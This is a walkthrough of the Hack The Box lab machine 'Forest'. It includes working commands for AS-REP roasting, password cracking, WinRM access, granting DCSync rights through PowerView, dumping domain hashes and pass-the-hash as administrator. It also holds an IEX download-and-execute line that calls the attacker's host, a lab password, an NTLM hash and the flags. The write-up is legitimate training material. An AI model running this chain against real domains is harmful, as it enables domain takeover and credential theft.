+++
title = "HTB - Forest"
date = 2025-06-22
+++

Forest is a fairly intermediate machine that lets the attacker play around with intentional SMB enumeration in an AD environment, ASREP roasting, ingesting and sniffing with Bloodhound, and abusing DCsync privileges for vertical escalation. Let's get into it.
### Scans
``` 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-12 18:28 EDT
Nmap scan report for 10.10.10.161
Host is up (0.13s latency).

PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-09-12 22:35:24Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h26m48s, deviation: 4h02m29s, median: 6m48s
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-time: 
|   date: 2024-09-12T22:35:34
|_  start_date: 2024-09-12T22:34:01
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2024-09-12T15:35:32-07:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.54 seconds

PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49668/tcp open  unknown
49670/tcp open  unknown
49676/tcp open  unknown
49677/tcp open  unknown
49684/tcp open  unknown
49703/tcp open  unknown
49974/tcp open  unknown



Making a script scan on extra ports: 5985, 9389, 47001, 49664, 49665, 49666, 49668, 49670, 49676, 49677, 49684, 49703, 49974                                                              
                                                                                             


PORT      STATE SERVICE    VERSION
5985/tcp  open  http       Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf     .NET Message Framing
47001/tcp open  http       Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc      Microsoft Windows RPC
49665/tcp open  msrpc      Microsoft Windows RPC
49666/tcp open  msrpc      Microsoft Windows RPC
49668/tcp open  msrpc      Microsoft Windows RPC
49670/tcp open  msrpc      Microsoft Windows RPC
49676/tcp open  ncacn_http Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc      Microsoft Windows RPC
49684/tcp open  msrpc      Microsoft Windows RPC
49703/tcp open  msrpc      Microsoft Windows RPC
49974/tcp open  msrpc      Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

We get a lot here. 11 open ports could lead to a lot of potential rabbit holes. We need to utilize our experience here. Because port `88` is open, we know that this is most likely a DC, and on top of that, we're given valuable information through our `nmap` SMB scripts ran on the target. We know the OS and Domain naming structure. We can add the machine to our `/etc/hosts` file and continue. `ldap`, `dns`, and `msrpc` are all interesting vectors as well. Should I come back empty-handed from those, I'll check out the more niche ports sitting on 464, 636, etc.

### Enumeration
##### 53
The first thing that I like to try is a zone transfer. `host -l forest.htb.local 10.10.10.161`  or dig @10.10.10.161  forest.htb.local` usually do the trick, but they don't work here, so I'll move on to SMB. A successful zone transfer command, should you need one in the future, is `dig axfr @10.10.10.161 htb.local`

##### 139/445
SMB shares usually provide a great deal of information through listing shares or even being able to access certain shares through null authentication. We can try with a tool like `smbmap` to list the share or `smbclient` to list and even connect. 
`smbmap -H forest.htb -u ""` doesn't give me anything as null authenticated, and `smbclient --list //forest.htb/ --no-pass` gives me nothing.

We can also try to user RPC over 135/445. We can use `rpcclient` to probe with null authentication.
`rpcclient -U "ldap" -N 10.10.10.161`, where the flags are for a null username and no password.

##### NOTE
We can also use `enum4linux -av 10.10.10.161` to serve as an automated reconnaissance tool in this sense, as it dumps AD information. Shout out to Kieth! We can use `nmap` as well. `nmap -n -sV --script "ldap* and not brute" 10.10.10.161`

<img alt="Image" async src="images/Screenshot 2024-09-14 at 9.43.27 PM.png" width="800px"></img>

### Initial Access

We can connect with `rpcclient`, and better yet, get access to information by using `enumdomusers` and `enumdomgroups`. If you want to dive deeper, you can do so with `querygroupmem [rid]`and `queryuser [rid]`.  I want to note a few things here. We can now take these and use an `impacket` script called `GetNPUsers.py` to try and authenticate some of these accounts against the Key Distribution Center. Kerberos pre-authentication must be disabled for this to work, and we can throw these against a wall to see what we find! Take the users and use `vim` to throw them into a `txt` file. Then, grep the usernames with the script below, and take that new file to pass to the Kerberos service using `impacket` and `GetNPUsers.py`. It's also important to note the importance of building tools correctly, and making sure that you are using the versions from the correct libraries! Stay organized.

`grep -oP 'user:\[\K[^\]]+' file.txt > newfile.txt`

``` bash
for user in $(cat newfile.txt); do python3 GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb/${user} | grep -v Impacket; done
```

Now, you might get errors depending on your `impacket` and python version. I recommend installing the latest versions of both, building them correctly (`setup.py`), and prepending any mention of the `impacket` scripts with the aforementioned version of python you want to run it. In my case, this was python3.

We can see that once the script is run, we get a TGT encrypted with the user's password for `svc-alfresco`. We can use `john` or `hashcat` to try and crack this. Lets copy this into a file and pass it to one of these (`john` in my case).

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

<img alt="Image" async src="images/Screenshot 2024-09-15 at 12.04.36 AM.png" width="800px"></img>

We get a password!

It's important to use this to re-enumerate our services. Connect again to SMB Shares, Spray credentials across accounts, etc. We used `smbmap` to map out shares again, and this time we've got access to 3.

<img alt="Image" async src="images/Screenshot 2024-09-15 at 12.34.33 AM.png" width="800px"></img>

I'll connect with `smbclient //forest.htb/SHARE --user svc-alfresco%s3rvice`. Rooting around a bit in the `SYSVOL` share, I found a `GptTmpl.inf`. I found out it sets user rights within the domain, and I'd love to do more research on it later.

Other than this, re-enumeration doesn't yield to much, but it doesn't matter because we can establish a shell using `evil-winrm` and enumerate further from there. Keep in mind, this only works because ports `5985` and `47001` are open and running `wsman` and `winrm`. These are the things to calibrate your mind with in the future.

```bash
evil-winrm -i 10.10.10.161 -u svc-alfresco -p 's3rvice'
```

<img alt="Image" async src="images/Screenshot 2024-09-15 at 12.16.49 AM.png" width="800px"></img>

Scooting around a bit, we can find the user flag in `\Users\svc-alfresco\Desktop`

<img alt="Image" async src="images/Screenshot 2024-09-15 at 12.51.21 AM.png" width="800px"></img>

`USER:43887e0a780a504a4e75db9cd43ef408`

### Privilege Escalation

Now, we can continue to enumerate with `cmd` tools. Use `net user /domain` and `net user svc-alfresco` to flesh out your understanding of the domain's policy and the users roles within them.

<img alt="Image" async src="images/Screenshot 2024-09-15 at 12.57.56 AM.png" width="800px"></img>

We're a part of the service accounts group. We'll want to figure out a way to migrate laterally or vertically.
Let's host an ingester called `SharpHound.exe` with our SMB server, and use that to visual understand our paths forward using `Bloodhound`. Start the SMB server by `cp` the `smbserver` to our working directory (take it from one of the other box directories, that means it's probably worked before without dependency issues). Next, prepare the `SharpHound.exe`. preferably from the updated SharpCollection repo, by moving it to the working directory. Then start the server with:

`python3 smbserver.py share /home/li0t/Desktop/HTB/Forest`

Now, we can go to Forest, and use the following to grab it:

`\\10.10.14.3\share\SharpHound.exe`

The file should execute, and we will be left with two files. Move the `.zip` file back to our machine with:

`copy FILE.zip \\10.10.14.3\share`

<img alt="Image" async src="images/Screenshot 2024-09-15 at 1.09.43 AM.png" width="800px"></img>

(NOTE! I've seen TCM do this all remotely from the host machine with a script from his PEH course. I haven't tried it yet, but wanted to include it here in case I come back and want to do things differently: `bloodhound-python -d htb.local -u svc-alfresco -p s3rvice -ns -c all`).

Now, we can start our `neo4j` service for `BloodHound` with `neo4j console`. Open `BloodHound`, login with credentials (neo4j, neo4j1) and import the data with the upload button. Once there, search for a user in the node and the data should populate.

<img alt="Image" async src="images/Screenshot 2024-09-15 at 1.22.37 AM.png" width="800px"></img>

Now, we've got to tailor our path. Right click on `svc-alfresco` and choose "Shortest Paths from Owned Principles" in the analysis tab. We should get a result like the following:

<img alt="Image" async src="images/Screenshot 2024-09-15 at 1.32.36 AM.png" width="800px"></img>

Now, there's a lot here, so let's go step by step. 

`svc-alfresco` is a member of `Service Accounts`, and by proxy, a member of `Privileged IT Accounts` and `Account Operators`. Doing research on `Account Operators`, we learn that they grant limited account creation privileges to a user, meaning that as `svc-alfresco`, we can create other users on the domain. 

There're great diagram, graphs, and explanations in this tool, so whenever you find yourself back here, take a look at all of the options and paths around a domain, and right click on the edges to learn about abuse of privileges and whatnot. 

So the plan of action is to create a new user, add the user to the `Windows Exchange Group`(where we have `GenericAll` permissions), give the user DcSync privileges with our `WriteDacle` permission, perform a DcSync attack to get all of the user hashes on the domain, and then pass them for administrator access.

Let's add a new user: `net user bobby password /add /domain`, and confirm his existence with `net user /domain`

<img alt="Image" async src="images/Screenshot 2024-09-15 at 2.03.46 AM.png" width="800px"></img>

Now, prepare to add him to the `Exchange Windows Permission` group: `net group "Exchange Windows Permissions" /add bobby`. Be timely in these next steps, as there is a [script](https://0xdf.gitlab.io/2020/03/21/htb-forest.html) that I read about that will revoke DcSync privileges every minute or so.

We'll need to grant ourselves DcSync capabilities with an exploit. PowerView is the way I've done it, but there are one-liners online and in Bloodhound! Look in your `/usr/share/windows-resources/powersploit/Recon` directory and copy the file to the working directory. Fire up a python server in the working directory on Kali, I'd run into execution issues when trying with the SMB server. Use IEX string to download:

```powershell
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.3:8000/PowerView.ps1')
```

Then, run these commands back to back. These will give `bobby` those DcSync privileges.

```powershell
$pass = convertto-securestring 'password' -AsPlainText -Force
```

```powershell
$cred = New-Object System.Management.Automation.PSCredential('htb\bobby', $pass)
```

```powershell
Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity bobby -Rights DCSync
```

<img alt="Image" async src="images/Screenshot 2024-09-15 at 2.37.18 AM.png" width="800px"></img>

Now, on our attacker machine, use `impacket-secretsdump` to gather hashes so that we can pass them with `evil-winrm`. (For reference, I tried this same thing with manually installed `impacket`, but no dice. Maybe Python configuration or something? Look into it.)

```
impacket-secretsdump htb.local/bobby:password@10.10.10.161
```

<img alt="Image" async src="images/Screenshot 2024-09-15 at 2.37.42 AM.png" width="800px"></img>

Luckily, we can pass the hash with `evil-winrm`, so long as we annotate the correct path with the ruby file. Pass with: 

`KALI: ruby /var/lib/gems/3.1.0/gems/evil-winrm-3.5/evil-winrm.rb -i 10.10.10.161 -u administrator -p aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6`

<img alt="Image" async src="images/Screenshot 2024-09-15 at 2.46.04 AM.png" width="800px"></img>

<img alt="Image" async src="images/Screenshot 2024-09-15 at 2.41.16 AM.png" width="800px"></img>

Mosey around to your flag!

`ROOT:bc07f404616302a5b807f47e1d280a7a`

#windows #easy #manual 

